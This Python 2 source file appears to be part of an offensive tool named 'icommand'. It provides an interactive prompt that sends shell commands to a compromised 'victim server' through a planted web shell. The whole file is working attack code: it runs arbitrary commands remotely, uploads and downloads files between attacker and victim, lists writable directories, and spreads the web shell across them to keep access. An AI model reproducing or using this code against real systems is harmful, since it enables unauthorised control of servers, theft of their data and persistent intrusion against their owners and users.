# importing modules
from request_info import request_type
from server_info import serverinfo
from menu import Colors, get_banner
from urllib import unquote
from subprocess import Popen
try:
    import readline
except ImportError:
    print '\n[!] readline module is required to provide elaborate line editing and history features.'
else:
    pass


class Commander(object):
    '''
    Class to execute commands on the victim server
    '''
    def BackConnect(self):
        self.cwd = serverinfo.source[3]
        i = 1
        # empty list to save attacker's pushed commands
        history = []
        while True:
            try:
                try:
                    # getting command to be executed from the user
                    command = raw_input('{user}{red}@{end}{green}{host_ip}{end}:~{yellow}({cwd}){end}-$ '.format(user=serverinfo.source[0],
                        red=Colors.RED, green=Colors.GREEN, yellow=Colors.YELLOW, end=Colors.END,
                        host_ip=serverinfo.source[5],
                        cwd=self.cwd))
                # if something went wrong screw the list
                except IndexError:
                    command = raw_input('icommand@server:$ ')
                history.append(unquote(command))
                if command not in ['exit', 'quite', 'bye']:
                    if command == 'clear':
                        Popen('clear', shell=True).wait()

                    # getting all commands attackr's did on the server
                    elif command == 'history':
                        x = 1
                        for command in history:
                            print '{0:2d} {1}'.format(x, command)
                            x += 1

                    # execute the command on the attacker's box if ! provided
                    # at the first of the command
                    elif command.startswith('!'):
                        Popen(command[1:], shell=True).wait()

                    # get stored info from
                    elif command == 'info':
                        print serverinfo.info

                    # get icommand banner
                    elif command == 'banner':
                        print get_banner

                    # get all writable directories
                    elif command == 'writable':
                        serverinfo.get_writable()

                    # spreat the shell to all writable directories
                    elif command == 'spread':
                        serverinfo.spread_shell()

                    elif command.startswith('download'):
                        if len(command.split()) != 3:
                            print '\n[!] Usage: download remote_file_path local_file_path'
                        else:
                            rfile_path = command.split()[1]
                            lfile_path = command.split()[2]
                            serverinfo.download_file(rfile_path, lfile_path)

                    elif command.startswith('upload'):
                        if len(command.split()) != 3:
                            print '\n[!] Usage: upload local_file_path remote_file_path'
                        else:
                            lfile_path = command.split()[1]
                            rfile_path = command.split()[2]
                            serverinfo.upload_file(lfile_path, rfile_path)

                    else:
                        cwd = self.cwd
                        if command.split()[0] == 'cd' and len(command.split()) > 1:
                            if '../' in command.split()[-1] or '..' in command.split()[-1]:
                                self.cwd = cwd.rstrip(cwd.split('/').pop()).rstrip('/')
                            else:
                                if command.split()[-1].startswith('/'):
                                    request_type.cmd = '[ -d {0} ] && echo is_valid'.format(command.split()[-1])
                                    if request_type.get_page_source().read().strip() == 'is_valid':
                                        self.cwd = command.split()[-1]
                                    else:
                                        print 'bash: cd: {}: No such file or directory'.format(command.split()[01])
                                else:
                                    request_type.cmd = '[ -d {0}/{1} ] && echo is_valid'.format(cwd, command.split()[-1])
                                    if request_type.get_page_source().read().strip() == 'is_valid':
                                        self.cwd = '{0}/{1}'.format(cwd, command.split()[-1])
                                    else:
                                        print 'bash: cd: {0}: No such file or directory'.format(command.split()[-1])

                        elif command.split()[0] == 'cd' and len(command.split()) == 1:
                            self.cwd = serverinfo.source[3]  # dirty patch

                        else:
                            # setting aliases for some commands to avoid
                            # issues realted to empty directories
                            command = command.replace('ls', 'ls -lha')
                            command = command.replace('rm', 'rm -v')
                            command = command.replace('ifconfig', '/sbin/ifconfig')
                            request_type.cmd = 'cd {0};{1}'.format(self.cwd, command)

                            # get the source code cotenets
                            source = request_type.get_page_source().read()
                            if source:
                                print source.rstrip()

                            # if the executed command doesn't exist
                            else:
                                print '{}: command not found'.format(unquote(command))

                # exist icommand if user provides exit as a command
                else:
                    print '\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
                    break

            # exit icommand if it recieved a ^c
            except KeyboardInterrupt:
                print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
                break
            i += 1

# taking an instance from the main class
commander = Commander()
